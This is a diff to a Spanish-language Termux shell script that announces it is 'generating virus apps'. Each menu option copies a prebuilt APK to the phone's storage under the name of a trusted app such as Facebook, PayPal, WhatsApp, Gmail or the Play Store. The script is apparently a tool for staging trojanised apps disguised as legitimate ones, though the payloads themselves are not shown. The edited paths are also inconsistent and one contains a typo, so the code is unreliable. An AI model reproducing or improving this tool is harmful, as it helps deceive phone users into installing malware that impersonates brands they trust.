@@ -50,9 +50,8 @@ echo " "
 		printf "$C [super]$G Generando Viruz app$W \n"
 		echo
 		echo
-		cd $PREFIX/bin/modulos
-                sleep 3
-		cp $PREFIX/bin/modulos/virus.jpg /sdcard
+		cd $HOME/virusc/modulos     
+		cp $PREFIX/modulos/virus.jpg /sdcard
 		mv /sdcard/virus.jpg /sdcard/viruz.apk
 		echo
 		printf "$G \n \t Listoo Ahora esta en tu memoria interna!!"
@@ -67,9 +66,8 @@ echo " "
 		printf "$C [super]$G Generando Viruz app$W \n"
 		echo
 		echo
-		cd $PREFIX/bin/modulos
-                sleep 3
-		cp $PREFIX/bin/modulos/Calculadora.apk /sdcard
+		cd $HOME/virusc/modulos
+		cp $PREFIX/modulos/Calculadora.apk /sdcard
 		mv /sdcard/Calculadora.apk /sdcard/Calculadora.apk
 		echo
 		printf "$G \n \t Listoo Ahora esta en tu memoria interna!!"
@@ -84,9 +82,8 @@ echo " "
 		printf "$C [super]$G Generando Viruz app$W \n"
 		echo
 		echo
-		cd $PREFIX/bin/modulos
-                sleep 3
-		cp $PREFIX/bin/modulos/Camara.apk /sdcard
+        cd $HOME/virusc/modulos
+		cp $PREFIX/modulos/Camara.apk /sdcard
 		mv /sdcard/Camara.apk /sdcard/Camara.apk
 		echo
 		printf "$G \n \t Listoo Ahora esta en tu memoria interna!!"
@@ -101,9 +98,8 @@ echo " "
 		printf "$C [super]$G Generando Viruz app$W \n"
 		echo
 		echo
-		cd $PREFIX/bin/modulos
-                sleep 3
-		cp $PREFIX/bin/modulos/Elite.apk /sdcard
+		cd $HOME/virusc/modulos
+		cp $PREFIX/modulos/Elite.apk /sdcard
 		mv /sdcard/ELITE.apk /sdcard/Elite.apk
 		echo
 		printf "$G \n \t Listoo Ahora esta en tu memoria interna!!"
@@ -118,9 +114,8 @@ echo " "
 		printf "$C [super]$G Generando Viruz app$W \n"
 		echo
 		echo
-		cd $PREFIX/bin/modulos
-                sleep 3
-		cp $PREFIX/bin/modulos/Facebook.apk /sdcard
+        cd $HOME/virusc/modulos
+		cp $PREFIX/modulos/Facebook.apk /sdcard
 		mv /sdcard/Facebook.apk /sdcard/Facebook.apk
 		echo
 		printf "$G \n \t Listoo Ahora esta en tu memoria interna!!"
@@ -135,9 +130,8 @@ echo " "
 		printf "$C [super]$G Generando Viruz app$W \n"
 		echo
 		echo
-		cd $PREFIX/bin/modulos
-                sleep 3
-		cp $PREFIX/bin/modulos/Galeria.apk /sdcard
+		cd $HOME/virusc/modulos
+		cp $PREFIX/modulos/Galeria.apk /sdcard
 		mv /sdcard/Galeria.apk /sdcard/Galeria.apk
 		echo
 		printf "$G \n \t Listoo Ahora esta en tu memoria interna!!"
@@ -153,9 +147,8 @@ echo " "
 		printf "$C [super]$G Generando Viruz app$W \n"
 		echo
 		echo
-		cd $PREFIX/bin/modulos
-                sleep 3
-		cp $PREFIX/bin/modulos/Gmail.apk /sdcard
+		cd $HOME/virusc/modulos
+		cp $PREFIX/modulos/Gmail.apk /sdcard
 		mv /sdcard/Gmail.apk /sdcard/Gmail.apk
 		echo
 		printf "$G \n \t Listoo Ahora esta en tu memoria interna!!"
@@ -170,9 +163,8 @@ echo " "
 		printf "$C [super]$G Generando Viruz app$W \n"
 		echo
 		echo
-		cd $PREFIX/bin/modulos
-                sleep 3
-		cp $PREFIX/bin/modulos/Google.apk /sdcard
+		cd $HOME/virusc/modulos
+		cp $PREFIX/modulos/Google.apk /sdcard
 		mv /sdcard/Google.apk /sdcard/Google.apk
 		echo
 		printf "$G \n \t Listoo Ahora esta en tu memoria interna!!"
@@ -187,9 +179,8 @@ echo " "
 		printf "$C [super]$G Generando Viruz app$W \n"
 		echo
 		echo
-		cd $PREFIX/bin/modulos
-                sleep 3
-		cp $PREFIX/bin/modulos/Internet-gratis.apk /sdcard
+		cd $HOME/virusc/modulos
+		cp $PREFIX/modulos/Internet-gratis.apk /sdcard
 		mv /sdcard/Internet-gratis.apk /sdcard/Internet-gratis.apk
 		echo
 		printf "$G \n \t Listoo Ahora esta en tu memoria interna!!"
@@ -204,9 +195,8 @@ echo " "
 		printf "$C [super]$G Generando Viruz app$W \n"
 		echo
 		echo
-		cd $PREFIX/bin/modulos
-                sleep 3
-		cp $PREFIX/bin/modulos/Operamini.apk /sdcard
+		cd $HOME/virusc/modulos
+		cp $PREFIX/modulos/Operamini.apk /sdcard
 		mv /sdcard/Operamini.apk /sdcard/Operamini.apk
 		echo
 		printf "$G \n \t Listoo Ahora esta en tu memoria interna!!"
@@ -221,9 +211,8 @@ echo " "
 		printf "$C [super]$G Generando Viruz app$W \n"
 		echo
 		echo
-		cd $PREFIX/bin/modulos
-                sleep 3
-		cp $PREFIX/bin/modulos/Paypal.apk /sdcard
+		cd $HOME/virusc/modulos
+		cp $PREFIX/modulos/Paypal.apk /sdcard
 		mv /sdcard/Paypal.apk /sdcard/Paypal.apk
 		echo
 		printf "$G \n \t Listoo Ahora esta en tu memoria interna!!"
@@ -238,9 +227,8 @@ echo " "
 		printf "$C [super]$G Generando Viruz app$W \n"
 		echo
 		echo
-		cd $PREFIX/bin/modulos
-                sleep 3
-		cp $PREFIX/bin/modulos/Playstore.apk /sdcard
+		cd $HOME/virusc/modulos
+		cp $PREFIX/modulos/Playstore.apk /sdcard
 		mv /sdcard/Playstore.apk /sdcard/Playstore.apk
 		echo
 		printf "$G \n \t Listoo Ahora esta en tu memoria interna!!"
@@ -255,9 +243,8 @@ echo " "
 		printf "$C [super]$G Generando Viruz app$W \n"
 		echo
 		echo
-		cd $PREFIX/bin/modulos
-                sleep 3
-		cp $PREFIX/bin/modulos/Termux.apk /sdcard
+		cd $HOME/virusc/modulos
+		cp $PREFIX/modulos/Termux.apk /sdcard
 		mv /sdcard/Termux.apk /sdcard/Termux.apk
 		echo
 		printf "$G \n \t Listoo Ahora esta en tu memoria interna!!"
@@ -272,9 +259,8 @@ echo " "
 		printf "$C [super]$G Generando Viruz app$W \n"
 		echo
 		echo
-		cd $PREFIX/bin/modulos
-                sleep 3
-		cp $PREFIX/bin/modulos/Whatsapp.apk /sdcard
+		cd $HOME/virusc/modulos
+		cp $PHOME/modulos/Whatsapp.apk /sdcard
 		mv /sdcard/Whatsapp.apk /sdcard/Whatsapp.apk
 		echo
 		printf "$G \n \t Listoo Ahora esta en tu memoria interna!!"
@@ -297,6 +283,6 @@ echo " "
 
 
 	else
-	       bash $PREFIX/bin/cvirus
+	       bash $PREFIX/cvirus
 
        fi
